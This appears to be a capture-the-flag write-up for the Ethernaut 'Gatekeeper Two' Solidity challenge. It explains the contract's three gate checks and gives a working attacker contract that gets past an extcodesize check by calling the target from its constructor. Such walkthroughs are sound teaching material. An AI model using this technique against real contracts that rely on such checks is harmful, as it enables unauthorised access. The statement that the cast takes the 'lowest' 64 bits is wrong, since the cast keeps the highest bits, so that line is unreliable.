# Gatekeeper Two

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

## Target contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Vulnerability

As for Gatekeeper One, there is no vulnerability per say. It's about crafting the right message to pass the checks.

### Gate One

```solidity
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```

This check implies that we must use an intermediary (i.e. Smart contract) to call the target contract.

### Gate Two

```solidity
  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }
```

This check implies that no code can be stored at the address currently making the call (i.e. NOT a smart contract).
Gate One and Two seem to contradict each other... and in a sense they do.

The trick here is that the EVM doesn't set the code size of a smart contract before its constructor has ran as you can see in the go-ethereum implementation of the CREATE opcode [here](https://github.com/ethereum/go-ethereum/blob/85064ed09b7243647ffd8c31a93c2abdbc3850d2/core/vm/evm.go#L487).

So all of our logic must take place in the constructor of our attacking contract.


### Gate Three

```solidity
  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }
```

This check might seem scary but it's actually quite simple : `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` takes the 64 lowest bits of keccak256 of our address ABI encoded. It is then XOR'ed with our 64 bits gatekey. The result should be equal to `uint64(0) - 1` which is an underflow, the actual value is `2^64 - 1`.

Crafting the appropriate gatekey is very simple:

`bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(2**64 - 1));`

The following contract solves the challenge :

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

    address targetContract;

    event myEvent(uint256);

    constructor(address _targetContract) {
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(2**64 - 1));
        targetContract = _targetContract;
        (bool success, ) = targetContract.call(abi.encodeWithSignature("enter(bytes8)", gateKey));
        require(success == true, "Failed to pass the gates");
    }
}
```
